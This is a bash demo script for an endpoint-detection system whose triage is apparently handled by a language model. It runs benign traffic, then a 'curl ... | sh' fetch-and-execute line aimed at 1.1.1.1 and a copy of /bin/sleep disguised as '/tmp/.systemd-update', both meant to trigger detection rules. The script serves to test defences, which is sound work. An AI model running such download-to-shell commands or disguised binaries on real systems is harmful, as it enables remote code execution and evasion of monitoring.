#!/usr/bin/env bash
# Generates the activity for the demo: ordinary traffic first, then two
# behaviours the triage must escalate.
#
#   Terminal 1:  sudo EDR_MODE=autonomous venv/bin/python3 orchestrator.py
#   Terminal 2:  bash scripts/demo_detection.sh
#
# Nothing here is harmful. The "threat" is /bin/sleep copied under another name,
# which works because the system decides from HOW a process runs -- from where,
# under what name, with what arguments -- and not from what the binary does
# inside. That shows the whole chain without running real malware.

set -u

DECOY=/tmp/.systemd-update

title() { printf '\n\033[1m== %s ==\033[0m\n' "$1"; }
step()  { printf '  $ %s\n' "$1"; }

title "1. Ordinary activity (must not escalate)"

step "curl -s https://api.github.com/health"
curl -s --max-time 5 https://api.github.com/health >/dev/null 2>&1

step "curl -s http://127.0.0.1:11434/api/tags   (Ollama itself)"
curl -s --max-time 5 http://127.0.0.1:11434/api/tags >/dev/null 2>&1

step "grep -r edr --include=*.py ."
grep -r edr --include='*.py' . >/dev/null 2>&1

echo "  -> no rule fired: the model never hears about any of this"

title "2. Download piped into a shell (downloader_to_shell)"

# 1.1.1.1 is Cloudflare's public resolver: a genuinely routable address, which
# is what the rule requires. Documentation ranges (198.51.100.x) do not work,
# because is_global excludes them just like loopback and private networks.
step "bash -c 'curl -s http://1.1.1.1/x.sh | sh'"
bash -c "curl -s --max-time 3 http://1.1.1.1/x.sh | sh" >/dev/null 2>&1

echo "  -> before this phase, this event was indistinguishable from the curl above"

title "3. Long-lived process from /tmp with a hidden name"

step "cp /bin/sleep $DECOY && $DECOY 600 &"
cp /bin/sleep "$DECOY"
"$DECOY" 600 &
DECOY_PID=$!

# Explicit check: the variable used to be named with a non-ASCII character,
# which bash does not accept as an identifier, so it ran the assignment as a
# command. The decoy never started and it went unnoticed until the telemetry
# was reviewed.
sleep 0.2
if ! kill -0 "$DECOY_PID" 2>/dev/null; then
    echo "  [!] the decoy did not start: without it there is no long-lived process to remediate"
    exit 1
fi

echo "  -> pid $DECOY_PID, severity 70 (exec_from_world_writable + hidden_binary)"
echo "  -> still alive while the model reasons: the case phase 3a unblocked"

title "Verification"
cat <<EOF
  Watch the orchestrator. Once the cycle finishes:

    ps -o pid,stat,comm -p $DECOY_PID

  STAT = T   -> frozen (SIGSTOP), the remediation ran
  no output  -> killed (SIGKILL)
  STAT = S   -> still alive: either the model said NOTHING, or a safeguard denied it

  To clean up:  kill $DECOY_PID 2>/dev/null; rm -f $DECOY
EOF
